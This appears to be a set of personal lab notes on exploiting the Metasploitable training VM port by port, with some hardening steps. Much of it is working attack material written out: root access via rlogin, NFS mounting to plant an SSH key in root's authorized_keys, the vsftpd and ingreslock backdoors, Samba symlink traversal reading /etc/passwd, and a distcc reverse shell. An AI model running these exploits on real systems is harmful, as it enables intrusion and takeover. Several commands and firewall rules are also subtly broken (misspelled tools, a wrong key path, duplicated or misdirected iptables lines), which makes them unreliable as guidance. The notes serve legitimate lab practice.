## Introduction
---
Working with the Metasploitable virtual machine and testing out different exploits curious on how  to protect against them. 


## Network Scan
----
Depending on your experience or comfort with Kali Linux, you can start with either `Zenmap` or use an `nmap` command directly on the command line to scan the Metasploitable machine for any open ports. 
* Zenmap because of the GUI, but nmap is more robust;
* recommend getting into the habit of using that instead. 
* After a port scan of the Metasploitables IP, the first glaring open port is 23 for Telnet. 

There are a couple exploits utilizing Telnet 

### Ports 512, 513, 514 => r-services misconfigured for remote access 
---
* `.rhosts++` situation. use the `rsh-client` if you are asked for **SSH** install `rsh-client`

run: `rlogin -l root metasploitable_ip`

### Network File System PORT 2049
-----
* needs `rpcbind` and `nfs-common` packages
* run `rcpinfo metasploitable_ip`
* `showmount -e metasploitable_ip`
* Generate an ssh-key, use filesystem access to add it into `authorized_files`
	* `ssh-keygen`
	* `mkdir /tmp/r00t`
	* `mount -t nfs metasploitable_ip:/ /tmp/r00t`
	* `cat /.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys`
	* `unmount /tmp/r00t`
	* `ssh root@metasploitable_ip` 


## Ports 23 and 25 - Telnet and SMTP
---

With Telnet, we can start with something simple; power up `Wireshark` on your Kali machine. You need to pick a network that you want to capture the network traffic on so pick the one that the Metasploitable machine is running. 

* With Wireshark running, Telnet to the Metasploitable machine from your Kali root command line. 

* The next exploit that uses Telnet involves port 25 for SMTP. 

There is a reason why no one uses Telnet anymore and the exploits above are just a few examples why - the best way to mitigate this is to disable Telnet (if it was a real server, use SSH/SSHFS ). 
This will be done by going into `/etc/inetd.conf` and commenting out the Telnet line, and restarting the machine.

Zenmap scan with no Telnet

### Port 21 - FTP
---
`telnet metasploitable_ip 21` with a `user backdoored:)` and type anything; PORT 6200 will open

`telnet metasploitable_ip 6200`

This exploit is pretty simple; you go into the metasploitable framework, choose the `vsftpd_234 backdoor` exploit, set the target IP, and run the exploit. 

This backdoor gives us root access to the Metasploitable machine. 

Besides the fact that vsftpd is on version 3.0.3 now and the obvious patch would be to update it, 

To patch it just for the version we had because in real life, the patches won't always be this simple. For this patch, you need to go into the vsftpd config file located in `/etc/vsftpd.conf` and disable anonymous upload for the FTP service.
##### No Anon Upload
`# upload line`

This alone is not enough for the exploit to not work; the reason being is that if you read the write up on the backdoor here, you notice that the attacker is able to log in as `:)` for the username and listen on port `6200`. 

A hardening technique for this particular case is to set up iptables to drop listening on unused ports. 

```bash
iptables -A INPUT -p tcp --dport 6200 -j DROP
iptables -A INPUT -p udp --dport 6200 -j DROP
```
* metaspoit exploit `unix/ftp/vsftp_234_backdoor` fails

### Ports 139 and 145 - Samba Anonmyous Login
---

* `smbclient -L //metasploitable_ip` 

```bash
root@ubuntu:~# msfconsole
msf > use auxiliary/admin/smb/samba_symlink_traversal
msf  auxiliary(samba_symlink_traversal) > set RHOST 192.168.51.102
msf  auxiliary(samba_symlink_traversal) > set SMBSHARE tmp
msf  auxiliary(samba_symlink_traversal) > exploit

[*] Connecting to the server...
[*] Trying to mount writeable share 'tmp'...
[*] Trying to link 'rootfs' to the root filesystem...
[*] Now access the following share to browse the root filesystem:
[*]     \\192.168.51.102\tmp\rootfs\

msf  auxiliary(samba_symlink_traversal) > exit

root@ubuntu:~# smbclient //192.168.99.131/tmp
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
smb: \> cd rootfs
smb: \rootfs\> cd etc
smb: \rootfs\etc\> more passwd
getting file \rootfs\etc\passwd of size 1624 as /tmp/smbmore.ufiyQf (317.2 KiloBytes/sec) (average 317.2 KiloBytes/sec)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh

```

There is another Metasploitable exploit so you just `use exploit/multi/samba/usermap_script` and `run` it to gain access to the victims machine.

Samba released a patch here, but another alternative is to comment out the userman script line in the samba config file. This can be found in `/etc/samba/smb.conf` on the Metasploitable machine. 

```text
#username map script = /etc/samba/scripts/mapusers.sh
```
* metasploit module ` ` set RPORT 445

### Port 1524 - Ingreslock Backdoor
----
`telnet metasploitable_ip 1524`

`id`

Port 1524 has the `xinetd super server daemon` running on it. This exploit is as simple as using a `netcat` command to get root access of the machine. 

`nc meatspoit_ip 1524`

This works due to the Ingreslock backdoor placed on the machine. If you go to `/etc/inetd.conf`, you can see the last line has this. 

`ingreslock stream tcp nowait root /bin/bash bash -i`

All that needs to be done here is delete that entire line, and then reboot the machine. 

Note that if you did find a line like this in your config in the wild, you would have to do some more digging to make sure the backdoor didn't spread elsewhere.

### Port 2049 - NFS
----
* Note that for this exploit, you need to first install `nfs-common` with `apt install nfs-common` on your Kali Linux machine. 

* There are many steps you can take to harden the NFS service, however for this particular machine I just added iptables commands to block the Kali machines IP from attempting to mount the Metasploitable machine. 

```bash
iptables -A INPUT -p tcp -s kali_ip --dport 2049 -m state --state NEW,ESTABLISH,RELATED -j DROP
iptables -A INPUT -p tcp -s kali_ip --dport 2049 -m state --state NEW,ESTABLISH,RELATED -j DROP
iptables -A OUTPUT -p udp -s kali_ip --dport 2049 -m state --state NEW,ESTABLISH,RELATED -j DROP
iptables -A OUTPUT -p udp -s kali_ip --dport 2049 -m state --state NEW,ESTABLISH,RELATED -j DROP
```

* `mount -t nfs metasploitable_ip:/ Exploit/`

### Port 5432 - PostGresSQL
---
* Weak password `postgres:postgres`

This is another easy Metasploit exploit that allows the attacker direct access into the meterpreter shell. 

* `use  exploit linux/postgres/postgres_payload`
* `exploit(linux/postgres/postgres_payload) set RHOST metasploitable_ip`
* `exploit(linux/postgres/postgres_payload) run`

* This worked because PostGres is set up to write to the default directory which means that the fix is to change the directory from the default so that the payload won't work. 

* The config file can be found in /etc/postgresql/8.3/main/postgresql.conf. 
* The default directory is /var/lib/postgresql/8.3/main so you can change it to whatever you like. 
		* Just know that you actually need to go out and create the new directory because writing it in the config file alone is not enough. Also, make sure you reboot the Metasploitable machine after changing this.

```text
# inside of /var/lib/postgresql/ver/main
data_directory = '/var/lib/postgresql/ver/datadir'
```

### VNC 
---
* weak password: `msfadmin:password`

### distccd => program to scale large compiler jobs across configured systesm
----
* attackers can abuse the service
```bash
msfconsole

msf > use exploit/unix/misc/distcc_exec
msf  exploit(distcc_exec) > set RHOST 192.168.99.131
msf  exploit(distcc_exec) > exploit

[*] Started reverse double handler
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo uk3UdiwLUq0LX3Bi;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "uk3UdiwLUq0LX3Bi\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.51.101:4444 -> 192.168.51.102:38897) at 2012-05-31 22:06:03 -0700

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```


## What Can't Be Patched
----

#### Port 22 - SSH
----

SSH, Telnet's updated replacement. 

The biggest issue  is the use of passwords (or lack thereof). 

Obviously, this was set up for testing purposes, but if you are actually using SSH, it would be way smarter to utilize public/private key pairs for authentication instead of passwords. 

This is because if we have the victim's SSH login credentials, we can easily log into their machines. They key pairs make for a much more secure connection and here is a YouTube tutorial for how to set that up.


### Port 3306 - MySQL
---

This can be exploited by using auxiliary modules on Metasploit to scan and find usernames and passwords. 

This was another exploit that demonstrated how passwords are not a strong protection mechanism against attackers. 

### Port 5900 - VNC
---
* This also uses an auxiliary module exploit on Metasploit. 

* For this particular case, since the password was "password", change that to something stronger or use public/private keys for this as well.

### Port 6667 - UnrealIRCd
---
* Another backdoor! This one actually can't be patched from the Metasploitable machines side  
		* read this statement released by Unreal

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 192.168.99.131
exploit
```

### Port 8180 - Apache Tomcat
---
This is yet another auxiliary module exploit where the attacker can find the victim's login credentials. 

* Similar to VNC, the user had weak credentials so the best mitigation would be to have stronger passwords or use public/private key pairs instead. 

### Port 2121 - vsftpd
----
* This exploit also involves weak passwords. 
* **FTP** isn't considered secure anymore and that it would be beneficial to switch to **SFTP**


## The Two Problem Children
----
### Port 80 - Apache
----
This vulnerability is PHP based injection attack on rapid 7's website


### Port 1099 - Java RMI Registry
----
* payload was written in Ruby
* doesn't work on JMX


# Mutillidae
